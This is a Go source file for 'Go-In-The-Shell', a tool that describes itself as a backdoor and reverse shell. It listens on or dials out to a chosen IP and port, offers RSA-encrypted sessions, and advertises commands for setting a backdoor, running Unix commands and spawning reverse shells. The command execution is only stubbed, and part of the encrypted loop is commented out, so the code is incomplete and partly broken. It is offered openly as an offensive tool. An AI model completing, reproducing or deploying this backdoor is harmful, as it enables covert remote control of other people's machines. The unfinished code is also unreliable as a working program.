package main

import (
	"os"
	"fmt"
	"net"
	"bufio"
	"strings"
	"crypto/rsa"
	"crypto/rand"
	"crypto/sha256"
	"encoding/gob"
)

func Banner() {
	fmt.Println(",---.        |        --.--|            ,---.|         |    |    \n|  _.,---.   |,---.     |  |---.,---.   `---.|---.,---.|    |    \n|   ||   |---||   |---  |  |   ||---'---    ||   ||---'|    |    \n`---\'`---\'   ``   \'     `  `   \'`---\'   `---\'`   '`---\'`---\'`---\'")
	fmt.Println("\nGo-In-The-Shell is a flexible and userfriendly backdoor")
	fmt.Println("Made By Denis <cr1ng3> REMACLE\n")
	fmt.Println("For \"legally ok\" use only")
}

func KeyGen() (rsa.PublicKey, rsa.PrivateKey) {
	// key generation
	priv_key, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		fmt.Println("Could not generate Keys")
		os.Exit(1)
	}
	pub_key := priv_key.PublicKey
	return pub_key, *priv_key
}

func split(tosplit string, sep rune) []string {
    var fields []string

    last := 0
    for i,c := range tosplit {
        if c == sep {
            // Found the separator, append a slice
            fields = append(fields, string(tosplit[last:i]))
            last = i + 1
        } 
    }

    // Don't forget the last field
    fields = append(fields, string(tosplit[last:]))

    return fields
}

func Encryption(message string, distant_pub_key rsa.PublicKey) string {
	//Encrypt outgoing data
	data := []byte(message)
	rng := rand.Reader

	ciphertext, err := rsa.EncryptOAEP(sha256.New(), rng, &distant_pub_key, data, nil)
	if err != nil {
		fmt.Printf("Error from encryption: %s\n", err)
		return "fuck"
	}
	return string(ciphertext)
}

func Decryption(message string, local_priv_key rsa.PrivateKey) string {
	//Decrypt incoming data
	data := []byte(message)
	rng := rand.Reader

	plaintext, err := rsa.DecryptOAEP(sha256.New(), rng, &local_priv_key, data, nil)
	if err != nil {
		fmt.Printf("Error from decryption: %s\n", err)
		return "fuck"
	}
	return string(plaintext)
}

func InterpretCommand(command string) string {
	command = strings.Trim(command, "\n")
	fields := split(command, ' ')
	fmt.Println(fields[0])
	if len(fields) == 1 {
		return "Commands you can use are : help, set_backdoor <PORT>, command <UNIX_COMMAND>, get_reverseshell <IP:PORT>"
	} else if fields[0] == "command" {
		return "command"
	} else {
		return "fuck"
	}
}

func EncryptedConnectionHandler(connection net.Conn, local_pub_key rsa.PublicKey, local_priv_key rsa.PrivateKey, connect bool){
	//A goroutine to receive data from distants
	fmt.Printf("Handling %s\n", connection.RemoteAddr().String())

	//We use gob encoding in order to transmit and receive data safely
	enc := gob.NewEncoder(connection)
    dec := gob.NewDecoder(connection)

	if connect == true {
		var distant_pub_key = rsa.PublicKey{}
		//Big dumb key exchange
		enc.Encode(&local_pub_key)
		dec.Decode(&distant_pub_key)
	} else {
		//Big dumb key exchange
		var distant_pub_key = rsa.PublicKey{}
		dec.Decode(&distant_pub_key)
		enc.Encode(&local_pub_key)
	}

	for {
		var command string
		dec.Decode(&command)
		//output := InterpretCommand(Decryption(command, local_priv_key))
		//enc.Encode(Encryption(output+"\nGO-IN-THE-SHELL >> ", distant_pub_key))
	}
	connection.Close()
}

func NormalConnectionHandler(connection net.Conn) {
	//A goroutine to receive data from distants
	fmt.Printf("Handling %s\n", connection.RemoteAddr().String())
	fmt.Fprintf(connection, "  ____                   ___                   _____   _                      ____    _              _   _ \n / ___|   ___           |_ _|  _ __           |_   _| | |__     ___          / ___|  | |__     ___  | | | |\n| |  _   / _ \\   _____   | |  | '_ \\   _____    | |   | '_ \\   / _ \\  _____  \\___ \\  | '_ \\   / _ \\ | | | |\n| |_| | | (_) | |_____|  | |  | | | | |_____|   | |   | | | | |  __/ |_____|  ___) | | | | | |  __/ | | | |\n \\____|  \\___/          |___| |_| |_|           |_|   |_| |_|  \\___|         |____/  |_| |_|  \\___| |_| |_|\nGo-In-The-Shell is a flexible and userfriendly reverse shell\nGO-IN-THE-SHELL >> ")
	
	for {
		command, _ := bufio.NewReader(connection).ReadString('\n')
		output := InterpretCommand(command)
		fmt.Fprintf(connection, output+"\nGO-IN-THE-SHELL >> ")
	}
	connection.Close()
}

func Connect(ip_port string, encrypted bool) {
	connection, err := net.Dial("tcp", ip_port)
	if err != nil {
		fmt.Printf("Could not connect: %s\n", err)
		os.Exit(1)
	}
	
	if encrypted == true {
		local_pub_key, local_priv_key := KeyGen()
		EncryptedConnectionHandler(connection, local_pub_key, local_priv_key, true)
	} else {
		NormalConnectionHandler(connection)
	}
}

func Listen(ip_port string, encrypted bool) {
	listener, err := net.Listen("tcp", ip_port)
	if err != nil {
		fmt.Printf("Could not start listener: %s\n", err)
		os.Exit(1)
	}
	defer listener.Close()

	for {
		connection, err := listener.Accept()
		if err != nil {
			fmt.Println("Could not Accept connection")
		}
	
		if encrypted == true {
			local_pub_key, local_priv_key := KeyGen()
			EncryptedConnectionHandler(connection, local_pub_key, local_priv_key, false)
		} else {
			NormalConnectionHandler(connection)
		}
	}
}

func main(){
	Banner()

	arguments := os.Args

	if len(arguments) == 1 {
			fmt.Println("Please provide arguments")
			fmt.Println("gits <IP:PORT> : reach to given host")
			fmt.Println("gits -l <IP:PORT> : listen on given port")

			fmt.Println("\nYou must use our other tool in order to use encryption")
			fmt.Println("add -e at the end of the command for encrypted connection")
			os.Exit(1)
	}

	if arguments[1] == "-l" {
		if arguments[len(arguments)-1] == "-e" {
			Listen(arguments[2], true)
		} else {
			Listen(arguments[2], false)
		}
	} else {
		if arguments[len(arguments)-1] == "-e" {
			Connect(arguments[1], true)
		} else {
			Connect(arguments[1], false)
		}
	}
}